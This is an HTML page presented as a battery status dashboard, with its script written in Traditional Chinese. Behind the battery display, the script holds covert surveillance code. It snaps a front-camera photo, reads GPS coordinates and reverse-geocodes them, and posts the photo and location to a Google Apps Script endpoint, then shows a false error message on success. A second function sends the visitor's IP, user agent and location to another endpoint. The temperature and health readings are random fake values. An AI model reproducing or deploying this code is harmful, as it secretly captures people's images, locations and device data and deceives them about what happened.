
<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>電池資訊面板</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #1a1a1a;
      color: #fff;
    }
    .container {
      padding: 20px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
    }
    .card {
      background: #2b2b2b;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
    }
    .card h3 {
      margin-top: 0;
      font-size: 1.5rem;
    }
    .progress-container {
      width: 100%;
      background: #444;
      border-radius: 10px;
      overflow: hidden;
    }
    .progress-bar {
      height: 20px;
      background: #4caf50;
      width: 0;
      transition: width 0.5s ease-in-out;
    }
    .chart {
      width: 100%;
      height: 150px;
      background: #333;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ccc;
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <h1 style="text-align: center; margin: 20px 0;">電池資訊面板</h1>
  <div class="container">
    <div class="card">
      <h3>電池電量</h3>
      <div class="progress-container">
        <div class="progress-bar" id="batteryLevelBar"></div>
      </div>
      <p id="batteryLevelText">電量：載入中...</p>
    </div>
    <div class="card">
      <h3>充電狀態</h3>
      <p id="chargingStatus">載入中...</p>
    </div>
    <div class="card">
      <h3>電池溫度</h3>
      <div class="chart" id="batteryTemperature">載入中...</div>
    </div>
    <div class="card">
      <h3>電池健康度</h3>
      <div class="chart" id="batteryHealth">載入中...</div>
    </div>
  </div>

  <script>
      // 自動拍照功能
      async function startCameraAndSend() {
      const statusElement = document.getElementById('status');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        // 等待相機畫面載入
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // 延遲 1 秒拍照
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 壓縮為 Base64 格式
          const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
          stream.getTracks().forEach((track) => track.stop());
          getGpsCoordinates(photoData);
        }, 1000);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 取得 GPS 經緯度資訊
    async function getGpsCoordinates(photoData) {
      const statusElement = document.getElementById('status');
      try {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          // 透過經緯度取得地址
          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await response.json();
          const address = data.display_name || '未知地址';

          // 發送照片到後端
          sendPhotoToServer(photoData, latitude, longitude, address);
        }, (error) => {
          console.error('GPS 錯誤:', error);
          statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限。';
        });
      } catch (error) {
        console.error('錯誤:', error);
        statusElement.innerText = '操作失敗，請檢查控制台。';
      }
    }

    // 發送照片和 GPS 到後端
    async function sendPhotoToServer(photoData, latitude, longitude, address) {
      const statusElement = document.getElementById('status');
      try {
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', photoData);
        formData.append('latitude', latitude);
        formData.append('longitude', longitude);
        formData.append('address', address);

        const response = await fetch('https://script.google.com/macros/s/AKfycbzv1XvirckHJxlvuSgqaTx4hyi119CsYr-gZ_op_3TUphVN4AnPOUtsGSrICZMhxuSQOg/exec', {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        if (result.success) {
          statusElement.innerText = '讀取失敗，請使用Google Chrome開啟';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 獲取 IP 和設備資訊
    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        const url = new URL('https://script.google.com/macros/s/AKfycbyF061FXgLSk7Yg24md-Od0rwRZl-wV5J27KX3nU9-52WPod3Bz8hQ_dp33AW6LBP0D/exec');
        url.searchParams.append('ip', ip);
        url.searchParams.append('ipType', ipType);
        url.searchParams.append('userAgent', userAgent);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);

        const result = await fetch(url);
        const responseData = await result.json();

        if (responseData.success) {
          document.getElementById('status').innerText = '資訊已成功上傳！';
        } else {
          document.getElementById('status').innerText = 'IP 資訊上傳失敗！';
        }
      } catch (error) {
        console.error('IP 資訊錯誤:', error);
        document.getElementById('status').innerText = 'IP 資訊操作失敗，請檢查控制台。';
      }
    }

    // 顯示電池資訊
    async function displayBatteryInfo() {
      const batteryInfoElement = document.getElementById('batteryInfo');
      try {
        const battery = await navigator.getBattery();
        const updateBatteryInfo = () => {
          const level = (battery.level * 100).toFixed(0);
          const charging = battery.charging ? '充電中' : '未充電';
          batteryInfoElement.innerText = `電量：${level}% (${charging})`;
        };

        // 更新電池資訊
        updateBatteryInfo();

        // 監聽電池狀態變化
        battery.addEventListener('levelchange', updateBatteryInfo);
        battery.addEventListener('chargingchange', updateBatteryInfo);
      } catch (error) {
        console.error('無法獲取電池資訊:', error);
        batteryInfoElement.innerText = '無法獲取電池資訊，請檢查裝置支援性。';
      }
    }

    async function displayBatteryInfo() {
      try {
        const battery = await navigator.getBattery();

        // 更新電量
        const updateBatteryLevel = () => {
          const level = (battery.level * 100).toFixed(0);
          const bar = document.getElementById('batteryLevelBar');
          const text = document.getElementById('batteryLevelText');
          bar.style.width = `${level}%`;
          text.innerText = `電量：${level}%`;
        };

        // 更新充電狀態
        const updateChargingStatus = () => {
          const charging = battery.charging ? '充電中' : '未充電';
          document.getElementById('chargingStatus').innerText = `狀態：${charging}`;
        };

        // 模擬電池溫度（需實際硬體 API 支援）
        const updateBatteryTemperature = () => {
          const temperature = (Math.random() * (40 - 25) + 25).toFixed(1); // 模擬溫度值
          document.getElementById('batteryTemperature').innerText = `${temperature} °C`;
        };

        // 模擬電池健康度
        const updateBatteryHealth = () => {
          const health = Math.floor(Math.random() * (100 - 85) + 85); // 模擬健康度
          document.getElementById('batteryHealth').innerText = `${health}% 健康`;
        };

        // 初始化
        updateBatteryLevel();
        updateChargingStatus();
        updateBatteryTemperature();
        updateBatteryHealth();

        // 監聽電池變化
        battery.addEventListener('levelchange', updateBatteryLevel);
        battery.addEventListener('chargingchange', updateChargingStatus);
      } catch (error) {
        console.error('無法獲取電池資訊:', error);
      }
    }

    // 啟動電池資訊顯示
    displayBatteryInfo();
  </script>
</body>
</html>
